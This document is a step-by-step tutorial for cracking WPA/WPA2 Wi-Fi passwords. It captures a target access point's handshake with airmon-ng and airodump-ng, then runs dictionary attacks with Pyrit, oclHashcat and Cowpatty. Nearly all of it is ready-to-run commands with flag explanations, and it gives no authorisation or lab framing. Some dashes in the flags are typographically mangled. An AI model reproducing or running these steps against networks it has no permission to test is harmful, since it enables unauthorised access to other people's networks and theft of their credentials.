3 Ways to Crack Wifi using Pyrit, oclHashcat and Cowpatty

First start the monitor mode on our wireless adaptor .

--------------------------------------------------------( airmon-ng start wlan0 )

Now the monitor mode is enabled with name wlan0mon.

and then with the following command start listening to all the available wifi connections:

--------------------------------------------( airodump-ng wlan0mon )
After running the above command it will start listening all the wifi traffic nearby so wait till your target appears and then hit ctrl^c.

Now we have to listen to a specific channel on which the target is present . Now run command:

--------------------------------------------( airodump-ng -c 2 –bssid 3C:1E:04:XX:XX:XX –write sommay wlan0mon )

-c == channel number of the target (2 in my case , see the CH column)

–bssid == MAC address of the target AP

–write == name of the capture file

Now wait till the WPA handshake is captured and then hit crtl^c.

Now a file named sommay-01.cap will be generated


[1] PYRIT
First method to crack the password from the capture file is PYRIT . We will use dictionary-attack so run command:

( pyrit -i /usr/share/nmap/nselib/data/password.lst -r sommay-01.cap attack_passthrough )

-i == path to the input file in our case  it is the path to dictionary

-r ==  path to the captured fle which in our case it is sommay-01.cap

attack_passthrough == this options is to specify that a dictionary attack is to be performed

As you can see it has successfully cracked the password.
 
 
[2] OCLHASHCAT
First of all download oclhashcat from its official website: https://hashcat.net/files/hashcat-2.00.7z

First we have to convert the .cap file we captured with airodump-ng previously  to .hccap with aircrack-ng  by command:

----------------------------------( aircrack-ng sommay-01.cap -J sommay-01 )

-J == the path to the output file with extension .hccap

Now copy the dictionary you want to use in the Hashcat folder. Now enter in the hashcat folder and run command:

----------------------------------( ./hashcat-cli64.bin -m 2500 /root/sommay-01.hccap passwords.lst )

In above command if you are using 32 bit system replace 64 with 32.

-m is the hash type  which is 2500 for WPA/WPA2 cracking

then give the path to .hccap file which you converted with aircrack-ng. and then the name of the dictionary file. As you can see it has successfully cracked the password

[3] COWPATTY 
For cracking with the help of cowpatty we have to first generate the hash file specific to the target AP. For this we will use genpmk so run command:

----------------------------------( genpmk -f passwords.lst -d cowpatty_dict -s SOMMAY )

-f == path to the dictionary file

-d == name of the output dictionary

-s == ESSID(Name) of the target AP(The name should be identical to the target AP)

Now it will generate a dictionary file named cowpatty_dict which will speed up the cracking process.
Now run command :

----------------------------------( cowpatty  -d cowpatty_dict -r sommay-01.cap -s SOMMAY )

-d == path to dictionary we generated with genpmk

-r == path to the capture file we generated with airodump-ng

-s == ESSID of the target AP(The name should be identical to the target AP)
